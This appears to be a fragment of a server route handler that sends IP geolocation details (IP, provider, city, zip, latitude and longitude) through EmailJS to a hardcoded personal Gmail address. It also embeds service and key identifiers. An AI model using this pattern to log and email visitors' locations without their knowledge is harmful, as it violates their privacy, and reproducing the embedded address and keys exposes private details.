try {
    const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            service_id: 'service_x25rs8q',
            template_id: 'template_3mgw9je',
            user_id: '4ItP8f4Z88r0-9S1M', // Public key
            template_params: {
                to_email: 'boriszarkov4@gmail.com', // The recipient email
                ip_address: ipData.query,
                provider: ipData.org + " (" + ipData.as + ")",
                timezone: ipData.timezone,
                country: ipData.country,
                city: ipData.city,
                zip: ipData.zip,
                latitude: ipData.lat,
                longitude: ipData.lon
            }
        }),
    });

    // Log the raw response text to debug
    const responseText = await response.text();
    console.log('Raw response from EmailJS:', responseText); // Logs the raw response

    // Now attempt to parse the response as JSON if it looks like JSON
    let result;
    try {
        result = JSON.parse(responseText); // Try to parse JSON
    } catch (e) {
        console.error('Error parsing response as JSON:', e);
        res.status(500).json({ error: 'Failed to parse response from EmailJS.' });
        return;
    }

    if (response.ok) {
        console.log('Email sent successfully:', result);
        res.status(200).json({ message: 'IP info sent to your email.' });
    } else {
        console.error('EmailJS error response:', result);
        throw new Error(result.error || 'Failed to send email');
    }
} catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ error: `Failed to send email. ${error.message}` });
}
